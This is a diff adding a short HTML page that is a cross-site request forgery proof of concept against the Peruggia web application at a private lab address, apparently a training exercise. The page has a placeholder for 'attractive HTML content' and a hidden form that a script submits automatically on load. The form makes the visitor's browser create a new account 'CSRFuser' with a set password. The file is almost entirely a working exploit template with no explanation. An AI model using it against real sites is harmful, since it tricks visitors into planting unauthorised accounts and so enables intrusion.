@@ -1,0 +1,13 @@
+<HTML>
+<BODY>
+...
+<!-- include attractive HTML content here -->
+...
+<FORM id="csrf" method="POST" action="http://10.7.7.5/peruggia/index.php?action=account&adduser=1">
+<input type="text" value="CSRFuser" name="newuser">
+<input type="text" value="password123!" name="newuserpass">
+<input type="submit" value="Submit">
+</FORM>
+<SCRIPT>document.getElementById("csrf").submit();</SCRIPT>
+</BODY>
+</HTML>
